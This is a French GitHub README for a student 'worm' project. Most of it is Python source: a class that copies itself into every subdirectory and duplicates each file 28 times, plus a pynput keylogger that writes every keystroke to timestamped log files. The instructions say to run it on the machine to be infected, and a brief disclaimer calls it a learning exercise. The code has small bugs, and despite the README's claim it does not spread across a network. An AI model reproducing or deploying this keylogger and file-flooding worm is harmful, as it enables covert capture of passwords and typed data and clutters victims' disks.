# Ver de 0xM@rt

[![forthebadge](https://forthebadge.com/images/badges/made-with-python.svg)](https://forthebadge.com)

Dans le cadre de ma formation j'ai du développer un ver

le but du Ver informatique et de se reproduit sur plusieurs ordinateurs en utilisant un réseau informatique. 


## Pour commencer

Faite attention ce logiciel a été créé dans le but d'apprentissage il ne faut pas l'utiliser a des fin malvaillante. D'ailleur il est supprimé automatiquement par windows defender.


### Pré-requis

Il faut executer le fichier ver.py et avoir un dossier test ou le vers pourras ce dupliquer.


### Installation

* _Pour_ _Windows_ :

  Pour installer python il faut se rendre sur https://www.python.org/downloads/

* _Pour_ _Ubuntu_ :

  Pour installer python il faut utiliser la commande sudo apt-get install python

## Démarrage

Pour lancer le logiciel il faut juste taper *Python3 ver.py* sur la machine a infecter


## Explication du code 


* _Pour_ _ver.py_ :

--------------------------Les imports---------------------

os fournit une façon portable d'utiliser les fonctionnalités dépendantes du système d'exploitation

pynput permet de contrôler et de surveiller les périphériques d'entrée.

datime permet fournir différentes fonctions liées au temps 

logging permet de gerer les logs


----------------------Traitement------------------------

Tout d'abords nous avons la class worm pour la création de notre vers , le ver ce copy et ce replique dans un dossier test et modifie les extensions des fichier copié

```python
class Worm:
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path="/"
        else:
            self.path = path
        
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list=[]
        else:
            self.target_dir_list = target_dir_list

        if isinstance(target_dir_list, type(None)):
            self.iteration = 28
        else:
            self.iteration = iteration

        # path absolu
        self.own_path = os.path.realpath(__file__)
    
    def list_directories(self, path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)

        for file in files_in_current_directory:
            
            if not file.startswith('.'):
                # Prends le PATH complet
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
    
    def create_new_worm(self):
         for directory in self.target_dir_list:
            destination = os.path.join(directory, "vers.py")
            # Copie le script dans le nouveau répertoire avec un noms similaires
            shutil.copyfile(self.own_path, destination)

    def copy_existing_file(self):
        # La méthode suivante sera utilisée pour dupliquer les fichiers un nombre de fois (iteration)
         for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path
                    for i in range(self.iteration):
                        destination = os.path.join(directory,(file+str(i)))
                        shutil.copyfile(source, destination)

   
    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()
        self.copy_existing_file()
  ```
 
 
Le code suivant permet d'appeler toutes les foncitons au lancement du ver

```python

#--------------------------execution du code avec le main-----------------------

if __name__=="__main__":
    current_directory = os.path.abspath(r"C:\Users\User\Documents\test")
    worm = Worm(path=current_directory)
    worm.start_worm_actions()  
    keylog = Keylogger()
    keylog.create_log_directory()
    keylog.write_log_file()
 ```

----------Ajout de fonctionnalité---------------

j'ai ajouté un keylogger a mon vers pour cela mon programme va ecrire un fichier de log dans mon repertoire actuel avec la date et l'heure et avec les touches qui auront été appuyées

```python
#-------------------------Keylogger-------------------------------

class Keylogger:
        
    def create_log_directory(self):
        sub_dir = "log"
        cwd = os.getcwd()
        self.log_dir = os.path.join(cwd,sub_dir)
        if not os.path.exists(sub_dir):
            os.mkdir(sub_dir)
    
    
    @staticmethod
    def on_press(key):
        try:
            logging.info(str(key))
        except Exception as e:
            logging.info(e)
        
            
    def write_log_file(self):
        # exemple de format: '2022-12-02-186747'
        time = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
        # fichier de log
        logging.basicConfig(
                 filename=(os.path.join(self.log_dir, time) + "-log.txt"),
                 level=logging.DEBUG, 
                 format= '[%(asctime)s]: %(message)s',
             )
        
        with Listener(on_press=self.on_press) as listener:
            listener.join()

#-------------------------Keylogger-------------------------------
```
De plus j'ai modifier un peu les fonctions copy_existing_file pour que le ver ce replique un certain nombre de fois dans un directory spécifique , il est également possible que celui-ci ce replique dans plusieur dossier différents(plusieur machine)

## Auteurs
Listez le(s) auteur(s) du projet ici !
* **0xM@rt** _alias_ [@0xM@rt](https://github.com/0xMart)



